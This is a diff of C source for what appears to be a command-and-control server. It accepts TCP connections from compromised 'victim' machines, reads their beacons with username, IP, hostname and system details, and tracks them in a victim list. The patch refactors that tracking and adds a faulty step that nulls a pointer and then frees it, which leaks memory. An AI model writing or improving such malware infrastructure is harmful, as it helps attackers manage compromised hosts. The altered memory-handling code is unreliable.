@@ -53,22 +53,23 @@ bool net_update_victim_count(){
   return true;
 }
 
-int net_update_victims(net_client_beacon_t *p_victim){
+int net_update_victims(net_client_beacon_t *victim){
   /*
     :TODO: set pointer to current victims client beacon
     :p_victim: pointer to victim client beacon
     :returns: -1 on failure and element index on success
  */
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
-    if (p_victims[i]->sysinfo.username == p_victim->sysinfo.username &&
-         p_victims[i]->sysinfo.ip == p_victim->sysinfo.ip){
-      p_victims[i] = p_victim;
+    if (p_victims[i] != NULL &&
+        (strcmp(p_victims[i]->sysinfo.username, victim->sysinfo.username) == 0) &&
+        (strcmp(p_victims[i]->sysinfo.ip, victim->sysinfo.ip) == 0)){
+      p_victims[i] = victim;
       return i;
     }
   }
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
     if (p_victims[i] == NULL){
-      p_victims[i] = p_victim;
+      p_victims[i] = victim;
       net_update_victim_count();
       return i;
     }
@@ -77,21 +78,23 @@ int net_update_victims(net_client_beacon_t *p_victim){
   return -1;
 }
 
-bool net_remove_victims(net_client_beacon_t *p_victim){
+bool net_remove_victims(net_client_beacon_t *victim){
   /*
     :TODO: remove victim from list
     :p_victim: pointer to victim struct
     :returns: boolean
   */
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
-    if (p_victims[i]->sysinfo.username == p_victim->sysinfo.username &&
-        p_victims[i]->sysinfo.ip == p_victim->sysinfo.ip){
+    if (p_victims[i] != NULL &&
+        (strcmp(p_victims[i]->sysinfo.username, victim->sysinfo.username) == 0) &&
+        (strcmp(p_victims[i]->sysinfo.ip, victim->sysinfo.ip) == 0)){
       memset(p_victims[i], 0, sizeof(net_client_beacon_t));
+      p_victims[i] = NULL;
+      free(p_victims[i]);
       net_update_victim_count();
       return true;
     }
   }
-  fprintf(stderr, "[-] failed to remove victim from p_victims\n");
   return false;
 }
 
@@ -102,7 +105,7 @@ void *net_t_client(void *client_fd){
   while (true){
     int read = recv(sock, p_net_client_beacon, sizeof(net_client_beacon_t), 0);
     if (!read){
-      continue;
+      break;
     }
     if (read < 0){
       fprintf(stderr, "[-] %s\n", strerror(errno));
@@ -127,7 +130,6 @@ void *net_t_client(void *client_fd){
     memset(p_net_server_beacon, 0, sizeof(net_server_beacon_t));
   }
   pthread_mutex_lock(&NET_PTHREAD_MUTEX);
-  net_remove_victims(p_net_client_beacon);
   /* printf("[+] DISCONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n", */
   /*        p_net_client_beacon->sysinfo.username, */
   /*        p_net_client_beacon->sysinfo.ip, */
@@ -135,9 +137,8 @@ void *net_t_client(void *client_fd){
   /*        p_net_client_beacon->sysinfo.arch, */
   /*        p_net_client_beacon->sysinfo.release, */
   /*        p_net_client_beacon->sysinfo.cpu_usage); */
+  net_remove_victims(p_net_client_beacon);
   pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
-  free(p_net_client_beacon);
-  free(p_net_server_beacon);
   pthread_exit(NULL);
 }
 
@@ -153,7 +154,7 @@ bool net_server(int port){
     return false;
   }
 
-  int server_fd, client_fd, err;
+  int server_fd, client_fd;
   struct sockaddr_in server, client;
 
   server_fd = socket(AF_INET, SOCK_STREAM, 0);
@@ -171,17 +172,14 @@ bool net_server(int port){
   server.sin_port        = htons(port);
   server.sin_addr.s_addr = htonl(INADDR_ANY);
 
-  err = bind(server_fd, (struct sockaddr *) &server, sizeof(server));
-  if (err < 0){
+  if (bind(server_fd, (struct sockaddr *) &server, sizeof(server)) < 0){
     fprintf(stderr, "[x] %s\n", strerror(errno));
     return false;
   }
 
   //printf("[+] bind to port %d\n", ntohs(server.sin_port));
 
-  if (listen(server_fd, NET_MAX_CLIENTS)  == 0){
-    //printf("[*] listening...\n");
-  } else{
+  if (listen(server_fd, NET_MAX_CLIENTS)  != 0){
     fprintf(stderr, "[x] %s\n", strerror(errno));
     return false;
   }
@@ -191,7 +189,7 @@ bool net_server(int port){
     pthread_t t_client;
     while (( client_fd = accept(server_fd, (struct sockaddr *)&client, (socklen_t *)&client_len))){
       if (pthread_create(&t_client, NULL, net_t_client, (void *)&client_fd) < 0){
-        fprintf(stderr, "[-] asdf %s\n", strerror(errno));
+        fprintf(stderr, "[-] %s\n", strerror(errno));
       }
     }
   }
